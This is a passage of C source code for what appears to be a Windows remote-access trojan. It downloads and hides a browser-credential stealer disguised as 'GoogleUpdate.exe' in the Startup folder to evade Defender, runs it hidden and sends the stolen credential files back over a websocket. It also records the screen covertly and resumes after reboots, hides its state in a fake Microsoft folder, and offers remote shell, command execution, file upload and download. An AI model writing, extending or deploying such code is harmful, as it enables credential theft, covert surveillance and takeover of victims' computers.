            // Check file size > 0
            HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD fileSize = GetFileSize(hFile, NULL);
                CloseHandle(hFile);
                
                if (fileSize > 0) {
                    char msg[256];
                    snprintf(msg, sizeof(msg), "[+] Sending: %s (%lu bytes)\n", find_data.cFileName, fileSize);
                    send_websocket_data(msg, strlen(msg));
                    download_file(file_path);
                    file_count++;
                }
            }
            
            if (delete_after) DeleteFileA(file_path);
        }
    } while (FindNextFileA(hFind, &find_data));
    FindClose(hFind);
    
    return file_count;
}

// Recursively send files from nested directories (for ChromElevator output)
int send_directory_recursive(const char* base_dir, int delete_after) {
    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", base_dir);
    HANDLE hFind = FindFirstFileA(search_path, &find_data);
    
    if (hFind == INVALID_HANDLE_VALUE) return 0;
    
    int total_files = 0;
    do {
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(find_data.cFileName, ".") != 0 && strcmp(find_data.cFileName, "..") != 0) {
                char subdir[MAX_PATH];
                snprintf(subdir, sizeof(subdir), "%s\\%s", base_dir, find_data.cFileName);
                total_files += send_directory_recursive(subdir, delete_after);
                if (delete_after) RemoveDirectoryA(subdir);
            }
        } else {
            if (strstr(find_data.cFileName, ".json") != NULL) {
                char file_path[MAX_PATH];
                snprintf(file_path, sizeof(file_path), "%s\\%s", base_dir, find_data.cFileName);
                
                HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD fileSize = GetFileSize(hFile, NULL);
                    CloseHandle(hFile);
                    
                    if (fileSize > 2) {
                        char msg[512];
                        snprintf(msg, sizeof(msg), "[+] Sending: %s (%lu bytes)\n", find_data.cFileName, fileSize);
                        send_websocket_data(msg, strlen(msg));
                        download_file(file_path);
                        total_files++;
                    }
                }
                if (delete_after) DeleteFileA(file_path);
            }
        }
    } while (FindNextFileA(hFind, &find_data));
    FindClose(hFind);
    
    return total_files;
}

// XOR decrypt a file in place
void xor_decrypt_file(const char* filepath, unsigned char key) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return;
    }
    
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        CloseHandle(hFile);
        return;
    }
    
    DWORD bytesRead;
    if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
        for (DWORD i = 0; i < fileSize; i++) {
            buffer[i] ^= key;
        }
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        DWORD bytesWritten;
        WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL);
    }
    
    free(buffer);
    CloseHandle(hFile);
}

void extract_browser_creds() {
    send_websocket_data("\n[*] Extracting browser credentials (Chrome/Edge/Brave)...\n", 59);
    
    // Use Startup folder (Defender exclusion usually set)
    char startup_dir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_dir))) {
        strcat(startup_dir, "\\");
    } else {
        // Fallback to temp
        GetTempPathA(MAX_PATH, startup_dir);
    }
    
    char chromelevator_path[MAX_PATH];
    char chromelevator_output[MAX_PATH];
    
    snprintf(chromelevator_path, sizeof(chromelevator_path), "%sGoogleUpdate.exe", startup_dir);
    snprintf(chromelevator_output, sizeof(chromelevator_output), "%sGoogleCache", startup_dir);
    
    // Clean up any existing files first
    DeleteFileA(chromelevator_path);
    
    // Remove old output directory recursively using shell
    char del_cmd[MAX_PATH * 2];
    snprintf(del_cmd, sizeof(del_cmd), "cmd /c rmdir /s /q \"%s\" 2>nul", chromelevator_output);
    system(del_cmd);
    
    // Create fresh output directory
    CreateDirectoryA(chromelevator_output, NULL);
    
    char url_msg[600];
    snprintf(url_msg, sizeof(url_msg), "[*] Downloading payload...\n");
    send_websocket_data(url_msg, strlen(url_msg));
    
    DWORD bytes_dl = 0;
    if (download_file_wininet(g_chromelevator_url, chromelevator_path, &bytes_dl) && bytes_dl > 100000) {
        char dl_msg[128];
        snprintf(dl_msg, sizeof(dl_msg), "[+] Downloaded: %lu bytes\n", bytes_dl);
        send_websocket_data(dl_msg, strlen(dl_msg));
        
        send_websocket_data("[*] Running extractor...\n", 25);
        
        // Run ChromElevator directly
        char run_cmd[MAX_PATH * 4];
        snprintf(run_cmd, sizeof(run_cmd), "\"%s\" all --kill --output-path \"%s\"", 
                chromelevator_path, chromelevator_output);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        ZeroMemory(&pi, sizeof(pi));
        
        if (CreateProcessA(chromelevator_path, run_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, startup_dir, &si, &pi)) {
            wait_process_keepalive(pi.hProcess, 120000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            int chrome_files = send_directory_recursive(chromelevator_output, 1);
            
            if (chrome_files > 0) {
                char msg[128];
                snprintf(msg, sizeof(msg), "\n[+] Extracted %d credential files\n\n", chrome_files);
                send_websocket_data(msg, strlen(msg));
            } else {
                send_websocket_data("[!] No credentials found in output folder\n\n", 43);
            }
        } else {
            DWORD err = GetLastError();
            char err_msg[256];
            snprintf(err_msg, sizeof(err_msg), "[!] Failed to run ChromElevator (error %lu)\n\n", err);
            send_websocket_data(err_msg, strlen(err_msg));
        }
    } else {
        char err_msg[256];
        snprintf(err_msg, sizeof(err_msg), "[!] Download failed (%lu bytes)\n\n", bytes_dl);
        send_websocket_data(err_msg, strlen(err_msg));
    }
    
    // Cleanup - delete from Startup folder
    DeleteFileA(chromelevator_path);
    snprintf(del_cmd, sizeof(del_cmd), "cmd /c rmdir /s /q \"%s\" 2>nul", chromelevator_output);
    system(del_cmd);
}

// ============== SCREEN RECORDING ==============

// Helper to save/load screen recording state for persistence across restarts
static void save_screenrecord_state() {
    char state_path[MAX_PATH];
    char appdata_path[MAX_PATH];
    // Use AppData instead of Temp so state persists across reboots
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
        char state_dir[MAX_PATH];
        sprintf(state_dir, "%s\\Microsoft\\Windows\\SystemData", appdata_path);
        CreateDirectoryA(state_dir, NULL);
        sprintf(state_path, "%s\\.screenrec_state.dat", state_dir);
    } else {
        char temp_dir[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_dir);
        sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
    }
    
    FILE* f = fopen(state_path, "w");
    if (f) {
        // Save enabled state AND recording path for resume after restart
        fprintf(f, "%d\n%s\n", g_screenrecord_enabled ? 1 : 0, g_screenrecord_path);
        fclose(f);
    }
}

static void load_screenrecord_state() {
    char state_path[MAX_PATH];
    char appdata_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
        sprintf(state_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_state.dat", appdata_path);
    } else {
        char temp_dir[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_dir);
        sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
    }
    
    FILE* f = fopen(state_path, "r");
    if (f) {
        int enabled = 0;
        char saved_path[MAX_PATH] = {0};
        if (fscanf(f, "%d\n", &enabled) == 1) {
            // Read the saved recording path
            if (fgets(saved_path, sizeof(saved_path), f)) {
                saved_path[strcspn(saved_path, "\r\n")] = 0;
                // Restore path if file/directory still exists
                if (strlen(saved_path) > 0) {
                    strcpy(g_screenrecord_path, saved_path);
                }
            }
            if (enabled) {
                // Auto-start recording on startup if it was enabled
                g_screenrecord_enabled = 1;
            }
        }
        fclose(f);
    }
}

static void clear_screenrecord_state() {
    char state_path[MAX_PATH];
    char appdata_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
        sprintf(state_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_state.dat", appdata_path);
    } else {
        char temp_dir[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_dir);
        sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
    }
    DeleteFileA(state_path);
    g_screenrecord_enabled = 0;
}

DWORD WINAPI screenrecord_thread(LPVOID param) {
    // Make process DPI aware to get actual screen resolution (same as screenshot)
    SetProcessDPIAware();
    
    // Create hidden video file path in temp directory
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    
    char frames_dir[MAX_PATH];
    
    // Check if we have an existing recording path to continue
    if (strlen(g_screenrecord_path) > 0) {
        // Extract frames directory from zip path (remove .zip extension)
        strcpy(frames_dir, g_screenrecord_path);
        char* zip_ext = strstr(frames_dir, ".zip");
        if (zip_ext) *zip_ext = '\0';
        
        // Check if directory exists, if not create it
        if (GetFileAttributesA(frames_dir) == INVALID_FILE_ATTRIBUTES) {
            CreateDirectoryA(frames_dir, NULL);
        }
    } else {
        // Generate unique filename - we'll create a folder for JPEG frames
        DWORD tick = GetTickCount();
        sprintf(frames_dir, "%s\\.screenrec_%d", temp_dir, tick);
        CreateDirectoryA(frames_dir, NULL);
        
        // Store the directory path for later retrieval
        sprintf(g_screenrecord_path, "%s\\.screenrec_%d.zip", temp_dir, tick);
    }
    
    // Save state so path persists across restarts
    save_screenrecord_state();
    
    // Get primary monitor dimensions (same method as screenshot - most reliable)
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);
    
    // Record at native resolution (no scaling) for full quality
    int record_width = screen_width;
    int record_height = screen_height;
    // Ensure even dimensions for video encoding
    record_width = (record_width / 2) * 2;
    record_height = (record_height / 2) * 2;
    
    // Create compatible DCs and bitmaps at FULL resolution
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, record_width, record_height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = record_width;
    bi.biHeight = -record_height;  // Negative = top-down DIB (correct orientation)
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = ((record_width * 3 + 3) & ~3) * record_height;
    
    // Allocate pixel buffer
    int stride = ((record_width * 3 + 3) & ~3);
    DWORD frame_num = 0;  // Initialize before potential goto
    DWORD frame_interval = 1000 / g_screenrecord_fps;
    
    BYTE* pixels = (BYTE*)malloc(stride * record_height);
    if (!pixels) goto cleanup;
    
    // Find the next frame number if continuing a previous recording
    WIN32_FIND_DATAA find_data;
    char search_pattern[MAX_PATH];
    sprintf(search_pattern, "%s\\frame_*.bmp", frames_dir);
    HANDLE find_handle = FindFirstFileA(search_pattern, &find_data);
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            // Extract frame number from filename
            DWORD num = 0;
            if (sscanf(find_data.cFileName, "frame_%d.bmp", &num) == 1) {
                if (num >= frame_num) {
                    frame_num = num + 1;  // Continue from next frame
                }
            }
        } while (FindNextFileA(find_handle, &find_data));
        FindClose(find_handle);
    }
    
    // Store frames directory path in a temp file for later
    char frames_info[MAX_PATH];
    sprintf(frames_info, "%s\\.screenrec_info.txt", temp_dir);
    FILE* info = fopen(frames_info, "w");
    if (info) {
        fprintf(info, "%s\n%d\n%d\n%d\n", frames_dir, record_width, record_height, g_screenrecord_fps);
        fclose(info);
    }
    
    save_screenrecord_state();
    
    while (g_screenrecord_running && g_connected) {
        DWORD start_time = GetTickCount();
        
        // Capture full screen at native resolution (from 0,0 like screenshot)
        BitBlt(hdcMem, 0, 0, record_width, record_height, hdcScreen, 0, 0, SRCCOPY);
        
        // Get pixels directly (no scaling)
        GetDIBits(hdcScreen, hBitmap, 0, record_height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        // Save frame as BMP (will compress with PowerShell later)
        char frame_path[MAX_PATH];
        sprintf(frame_path, "%s\\frame_%06d.bmp", frames_dir, frame_num);
        
        // Write BMP file
        BITMAPFILEHEADER bfh;
        ZeroMemory(&bfh, sizeof(bfh));
        bfh.bfType = 0x4D42;  // 'BM'
        bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bi.biSizeImage;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        // Fix biHeight for file (positive for bottom-up)
        BITMAPINFOHEADER bi_file = bi;
        bi_file.biHeight = record_height;
        
        FILE* bmp = fopen(frame_path, "wb");
        if (bmp) {
            fwrite(&bfh, sizeof(bfh), 1, bmp);
            fwrite(&bi_file, sizeof(bi_file), 1, bmp);
            
            // Write rows bottom-up for BMP format
            for (int y = record_height - 1; y >= 0; y--) {
                fwrite(pixels + y * stride, stride, 1, bmp);
            }
            fclose(bmp);
        }
        frame_num++;
        
        // Frame timing
        DWORD elapsed = GetTickCount() - start_time;
        if (elapsed < frame_interval) {
            Sleep(frame_interval - elapsed);
        }
    }
    
    free(pixels);
    
cleanup:
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    // After recording stops, convert frames to compressed video
    // Write compression script to file to avoid command-line length limits
    if (frame_num > 0) {
        char ps_script_path[MAX_PATH];
        sprintf(ps_script_path, "%s\\.compress_video.ps1", temp_dir);
        
        FILE* ps_script = fopen(ps_script_path, "w");
        if (ps_script) {
            fprintf(ps_script,
                "$ErrorActionPreference = 'SilentlyContinue'\n"
                "$frames = '%s'\n"
                "$outZip = '%s'\n"
                "$outMp4 = $outZip -replace '\\.zip$', '.mp4'\n"
                "\n"
                "# Check if frames exist\n"
                "$bmpCount = (Get-ChildItem \"$frames\\*.bmp\" -EA SilentlyContinue).Count\n"
                "if ($bmpCount -eq 0) { exit 1 }\n"
                "\n"
                "# Check for ffmpeg\n"
                "$ffmpeg = $null\n"
                "$ffPath = Join-Path $env:TEMP '.ff.exe'\n"
                "if (Test-Path $ffPath) { $ffmpeg = $ffPath }\n"
                "if (!$ffmpeg) {\n"
                "    @('ffmpeg.exe','C:\\ffmpeg\\bin\\ffmpeg.exe',\"$env:ProgramFiles\\ffmpeg\\bin\\ffmpeg.exe\") | ForEach-Object {\n"
                "        $f = Get-Command $_ -EA SilentlyContinue\n"
                "        if ($f -and !$ffmpeg) { $ffmpeg = $f.Source }\n"
                "    }\n"
                "}\n"
                "\n"
                "# Download ffmpeg if not found\n"
                "if (!$ffmpeg) {\n"
                "    try {\n"
                "        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n"
                "        $url = 'https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip'\n"
                "        $zip = Join-Path $env:TEMP '.ffz.zip'\n"
                "        $ext = Join-Path $env:TEMP '.fftmp'\n"
                "        (New-Object Net.WebClient).DownloadFile($url, $zip)\n"
                "        Expand-Archive -Path $zip -DestinationPath $ext -Force\n"
                "        $found = Get-ChildItem -Path $ext -Recurse -Filter 'ffmpeg.exe' | Select-Object -First 1\n"
                "        if ($found) {\n"
                "            Copy-Item $found.FullName $ffPath -Force\n"
                "            (Get-Item $ffPath).Attributes = 'Hidden'\n"
                "            $ffmpeg = $ffPath\n"
                "        }\n"
                "        Remove-Item $zip,$ext -Recurse -Force -EA SilentlyContinue\n"
                "    } catch {}\n"
                "}\n"
                "\n"
                "# Encode with ffmpeg at native resolution (no scaling)\n"
                "if ($ffmpeg -and (Test-Path $ffmpeg)) {\n"
                "    & $ffmpeg -y -framerate %d -i \"$frames\\frame_%%06d.bmp\" -c:v libx264 -crf 23 -preset fast -pix_fmt yuv420p -movflags +faststart $outMp4 2>$null\n"
                "    if (Test-Path $outMp4) {\n"
                "        Remove-Item $frames -Recurse -Force -EA SilentlyContinue\n"
                "        exit 0\n"
                "    }\n"
                "}\n"
                "\n"
                "# Fallback: Just zip the BMP files directly (no JPG conversion for reliability)\n"
                "Compress-Archive -Path \"$frames\\*\" -DestinationPath $outZip -Force -CompressionLevel Optimal -EA SilentlyContinue\n"
                "Remove-Item $frames -Recurse -Force -EA SilentlyContinue\n",
                frames_dir, g_screenrecord_path, g_screenrecord_fps);
            fclose(ps_script);
            
            // Run the script
            char ps_cmd[1024];
            sprintf(ps_cmd, "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%s\"", ps_script_path);
            
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            ZeroMemory(&pi, sizeof(pi));
            
            if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                // Wait up to 10 minutes for compression (ffmpeg download can take time)
                WaitForSingleObject(pi.hProcess, 600000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            
            // Clean up script
            DeleteFileA(ps_script_path);
        }
        
        // Check if ffmpeg created mp4 instead of zip
        char mp4_path[MAX_PATH];
        strcpy(mp4_path, g_screenrecord_path);
        char* ext = strstr(mp4_path, ".zip");
        if (ext) strcpy(ext, ".mp4");
        
        if (GetFileAttributesA(mp4_path) != INVALID_FILE_ATTRIBUTES) {
            strcpy(g_screenrecord_path, mp4_path);
        }
        
        // Clean up frame directory (in case script didn't)
        char del_cmd[1024];
        sprintf(del_cmd, "cmd.exe /c rd /s /q \"%s\" 2>nul", frames_dir);
        STARTUPINFOA si2;
        PROCESS_INFORMATION pi2;
        ZeroMemory(&si2, sizeof(si2));
        si2.cb = sizeof(si2);
        si2.dwFlags = STARTF_USESHOWWINDOW;
        si2.wShowWindow = SW_HIDE;
        ZeroMemory(&pi2, sizeof(pi2));
        if (CreateProcessA(NULL, del_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
            WaitForSingleObject(pi2.hProcess, 10000);
            CloseHandle(pi2.hProcess);
            CloseHandle(pi2.hThread);
        }
    }
    
    return 0;
}

// Internal function to start recording without messages (for resume)
void start_screenrecord_internal() {
    if (g_screenrecord_running) return;
    
    g_screenrecord_running = 1;
    g_screenrecord_enabled = 1;
    save_screenrecord_state();  // Persist state for next startup
    g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
}

void start_screenrecord() {
    if (g_screenrecord_running) {
        send_websocket_data("[!] Screen recording already running\n", 37);
        return;
    }
    
    g_screenrecord_running = 1;
    g_screenrecord_enabled = 1;  // Mark as enabled for auto-resume
    g_screenrecord_path[0] = '\0';  // Clear path so new file is created
    save_screenrecord_state();  // Persist state for next startup/wake
    g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
    
    if (g_screenrecord_thread) {
        send_websocket_data("[+] Screen recording started (native resolution, 5fps)\n", 55);
        send_websocket_data("[*] Recording persists across restarts until 'stoprecord'\n", 58);
        send_websocket_data("[*] Use 'stoprecord' to stop (compresses video)\n", 48);
        send_websocket_data("[*] Use 'getrecord' to download (auto-compresses if needed)\n", 60);
    } else {
        g_screenrecord_running = 0;
        g_screenrecord_enabled = 0;
        send_websocket_data("[!] Failed to start recording\n", 30);
    }
}

void stop_screenrecord() {
    if (!g_screenrecord_running && !g_screenrecord_enabled) {
        send_websocket_data("[!] Screen recording not running\n", 33);
        return;
    }
    
    send_websocket_data("[*] Stopping recording and compressing...\n", 42);
    
    g_screenrecord_running = 0;
    g_screenrecord_enabled = 0;  // Disable auto-start on startup
    g_screenrecord_paused_for_liveview = 0;
    
    if (g_screenrecord_thread) {
        // Wait longer for compression to complete (up to 5 minutes)
        WaitForSingleObject(g_screenrecord_thread, 300000);
        CloseHandle(g_screenrecord_thread);
        g_screenrecord_thread = NULL;
    }
    
    // DON'T clear path here - keep it so we can download the recording later
    clear_screenrecord_state();  // Clear auto-start state (won't start on reboot)
    send_websocket_data("[+] Screen recording stopped and compressed\n", 44);
    
    // Show file size
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (GetFileAttributesExA(g_screenrecord_path, GetFileExInfoStandard, &fad)) {
        LARGE_INTEGER size;
        size.LowPart = fad.nFileSizeLow;
        size.HighPart = fad.nFileSizeHigh;
        
        // Format size nicely
        char size_str[32];
        if (size.QuadPart >= 1048576) {
            sprintf(size_str, "%.1f MB", size.QuadPart / 1048576.0);
        } else if (size.QuadPart >= 1024) {
            sprintf(size_str, "%.1f KB", size.QuadPart / 1024.0);
        } else {
            sprintf(size_str, "%lld bytes", size.QuadPart);
        }
        
        char msg[256];
        sprintf(msg, "[*] Recording saved: %s\n", size_str);
        send_websocket_data(msg, strlen(msg));
        send_websocket_data("[*] Use 'getrecord' to download the recording\n", 46);
    } else {
        send_websocket_data("[!] Warning: Recording file may not exist\n", 42);
    }
}

void download_screenrecord() {
    // If recording is running, stop it first and wait for compression
    int was_running = g_screenrecord_running;
    if (g_screenrecord_running) {
        send_websocket_data("[*] Stopping recording and compressing for download...\n", 55);
        g_screenrecord_running = 0;
        if (g_screenrecord_thread) {
            // Wait for compression to complete (up to 5 minutes)
            WaitForSingleObject(g_screenrecord_thread, 300000);
            CloseHandle(g_screenrecord_thread);
            g_screenrecord_thread = NULL;
        }
        send_websocket_data("[+] Compression complete\n", 25);
    }
    
    // Check for mp4 file (ffmpeg output) if zip doesn't exist
    if (strlen(g_screenrecord_path) > 0) {
        char mp4_path[MAX_PATH];
        strcpy(mp4_path, g_screenrecord_path);
        char* ext = strstr(mp4_path, ".zip");
        if (ext) strcpy(ext, ".mp4");
        
        // Prefer mp4 if it exists
        if (GetFileAttributesA(mp4_path) != INVALID_FILE_ATTRIBUTES) {
            strcpy(g_screenrecord_path, mp4_path);
        }
    }
    
    // Now check if file exists
    if (strlen(g_screenrecord_path) == 0 || 
        GetFileAttributesA(g_screenrecord_path) == INVALID_FILE_ATTRIBUTES) {
        send_websocket_data("[!] No recording available (compression may have failed)\n", 57);
        return;
    }
    
    // Show file size before download
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (GetFileAttributesExA(g_screenrecord_path, GetFileExInfoStandard, &fad)) {
        LARGE_INTEGER size;
        size.LowPart = fad.nFileSizeLow;
        size.HighPart = fad.nFileSizeHigh;
        
        char size_str[32];
        if (size.QuadPart >= 1048576) {
            sprintf(size_str, "%.1f MB", size.QuadPart / 1048576.0);
        } else if (size.QuadPart >= 1024) {
            sprintf(size_str, "%.1f KB", size.QuadPart / 1024.0);
        } else {
            sprintf(size_str, "%lld bytes", size.QuadPart);
        }
        
        char msg[256];
        sprintf(msg, "[*] Downloading recording (%s)...\n", size_str);
        send_websocket_data(msg, strlen(msg));
    } else {
        send_websocket_data("[*] Downloading recording...\n", 29);
    }
    
    download_file(g_screenrecord_path);
    
    // Auto-restart if it was running and enabled
    if (was_running && g_screenrecord_enabled) {
        send_websocket_data("[*] Restarting recording...\n", 28);
        g_screenrecord_path[0] = '\0';  // New file
        start_screenrecord_internal();
    }
}

void delete_screenrecord() {
    if (strlen(g_screenrecord_path) == 0) {
        send_websocket_data("[!] No recording to delete\n", 27);
        return;
    }
    
    if (g_screenrecord_running) {
        send_websocket_data("[!] Stop recording first\n", 25);
        return;
    }
    
    if (DeleteFileA(g_screenrecord_path)) {
        send_websocket_data("[+] Recording deleted\n", 22);
        g_screenrecord_path[0] = '\0';
        clear_screenrecord_state();  // Clear persisted state
    } else {
        send_websocket_data("[!] Failed to delete recording\n", 31);
    }
}

void change_directory(const char* path) {
    if (SetCurrentDirectoryA(path)) {
        GetCurrentDirectoryA(MAX_PATH, g_current_dir);
        char msg[512];
        sprintf(msg, "[+] Changed to: %s\n", g_current_dir);
        send_websocket_data(msg, strlen(msg));
    } else {
        send_websocket_data("[!] Invalid directory\n", 22);
    }
}

// Handle incoming upload data from server
// Returns: 0 = not upload data, 1 = upload data processed, -1 = error
int handle_upload_data(char* data, int len) {
    // Check for upload start marker
    char* upload_start = strstr(data, "<<<UPLOAD_START>>>");
    
    if (upload_start && !g_upload_in_progress) {
        // Start of a new upload - initialize accumulation buffer
        g_upload_in_progress = 1;
        g_upload_buffer_len = 0;
        
        // Allocate or reallocate buffer (512KB should be enough for most files)
        if (g_upload_buffer_capacity < UPLOAD_BUFFER_SIZE) {
            if (g_upload_buffer) free(g_upload_buffer);
            g_upload_buffer = (char*)malloc(UPLOAD_BUFFER_SIZE);
            if (!g_upload_buffer) {
                send_websocket_data("[!] Upload buffer allocation failed\n", 37);
                g_upload_in_progress = 0;
                return -1;
            }
            g_upload_buffer_capacity = UPLOAD_BUFFER_SIZE;
        }
        
        // Copy data to accumulation buffer
        if (len > 0 && len < g_upload_buffer_capacity) {
            memcpy(g_upload_buffer, data, len);
            g_upload_buffer_len = len;
        }
    } else if (g_upload_in_progress) {
        // Accumulate more data
        if (g_upload_buffer && g_upload_buffer_len + len < g_upload_buffer_capacity) {
            memcpy(g_upload_buffer + g_upload_buffer_len, data, len);
            g_upload_buffer_len += len;
        }
    }
    
    // Check if we have complete upload (contains both markers)
    if (g_upload_in_progress && g_upload_buffer) {
        g_upload_buffer[g_upload_buffer_len] = '\0';  // Null terminate for strstr
        
        char* start_marker = strstr(g_upload_buffer, "<<<UPLOAD_START>>>");
        char* name_end = strstr(g_upload_buffer, "<<<NAME_END>>>");
        char* end_marker = strstr(g_upload_buffer, "<<<UPLOAD_END>>>");
        
        if (start_marker && name_end && end_marker) {
            // We have complete upload data - process it
            char* filename_start = start_marker + 18;  // len of <<<UPLOAD_START>>>
            char* pipe = strchr(filename_start, '|');
            
            if (pipe && pipe < name_end) {
                int filename_len = pipe - filename_start;
                if (filename_len > 0 && filename_len < MAX_PATH) {
                    strncpy(g_upload_filename, filename_start, filename_len);
                    g_upload_filename[filename_len] = '\0';
                    
                    // Get expected size
                    long expected_size = atol(pipe + 1);
                    
                    // Extract base64 data
                    char* b64_start = name_end + 14;  // len of <<<NAME_END>>>
                    int b64_len = end_marker - b64_start;
                    
                    if (b64_len > 0) {
                        // Decode base64
                        DWORD decoded_size = 0;
                        CryptStringToBinaryA(b64_start, b64_len, CRYPT_STRING_BASE64, NULL, &decoded_size, NULL, NULL);
                        
                        if (decoded_size > 0) {
                            BYTE* decoded_data = (BYTE*)malloc(decoded_size);
                            if (decoded_data) {
                                if (CryptStringToBinaryA(b64_start, b64_len, CRYPT_STRING_BASE64, decoded_data, &decoded_size, NULL, NULL)) {
                                    // Create full path in current directory
                                    char full_path[MAX_PATH * 2];
                                    sprintf(full_path, "%s\\%s", g_current_dir, g_upload_filename);
                                    
                                    FILE* f = fopen(full_path, "wb");
                                    if (f) {
                                        fwrite(decoded_data, 1, decoded_size, f);
                                        fclose(f);
                                        
                                        char msg[512];
                                        sprintf(msg, "[+] File saved: %s (%lu bytes)\n", full_path, decoded_size);
                                        send_websocket_data(msg, strlen(msg));
                                    } else {
                                        send_websocket_data("[!] Failed to create file\n", 27);
                                    }
                                }
                                free(decoded_data);
                            } else {
                                send_websocket_data("[!] Memory allocation failed for decode\n", 41);
                            }
                        } else {
                            send_websocket_data("[!] Base64 decode failed\n", 26);
                        }
                    }
                }
            }
            
            // Reset upload state
            g_upload_in_progress = 0;
            g_upload_buffer_len = 0;
            return 1;
        }
        
        // Still waiting for more data
        return 1;
    }
    
    // Check if this looks like upload data (contains start marker but no end)
    if (strstr(data, "<<<UPLOAD_START>>>") != NULL) {
        return 1;  // It's upload data, but incomplete
    }
    
    return 0;  // Not upload data
}

void handle_command(const char* cmd) {
    // Skip leading whitespace
    while (*cmd == ' ' || *cmd == '\t' || *cmd == '\r' || *cmd == '\n') cmd++;
    
    // Create a mutable copy and strip trailing whitespace
    char clean_cmd[4096];
    strncpy(clean_cmd, cmd, sizeof(clean_cmd) - 1);
    clean_cmd[sizeof(clean_cmd) - 1] = '\0';
    
    int len = strlen(clean_cmd);
    while (len > 0 && (clean_cmd[len-1] == ' ' || clean_cmd[len-1] == '\t' || 
                       clean_cmd[len-1] == '\r' || clean_cmd[len-1] == '\n')) {
        clean_cmd[--len] = '\0';
    }
    
    if (len == 0) return;
    
    if (strcmp(clean_cmd, "screenshot") == 0) {
        take_screenshot();
    }
    else if (strcmp(clean_cmd, "shell") == 0) {
        shell_session();
    }
    else if (strcmp(clean_cmd, "ps") == 0) {
        list_processes();
    }
    else if (strncmp(clean_cmd, "download ", 9) == 0) {
        download_file(clean_cmd + 9);
    }
    else if (strncmp(clean_cmd, "cmd ", 4) == 0) {
        execute_command(clean_cmd + 4);
    }
    else if (strncmp(clean_cmd, "cd ", 3) == 0) {
        change_directory(clean_cmd + 3);
    }
    else if (strcmp(clean_cmd, "pwd") == 0) {
        char msg[512];
        sprintf(msg, "%s\n", g_current_dir);
        send_websocket_data(msg, strlen(msg));
    }
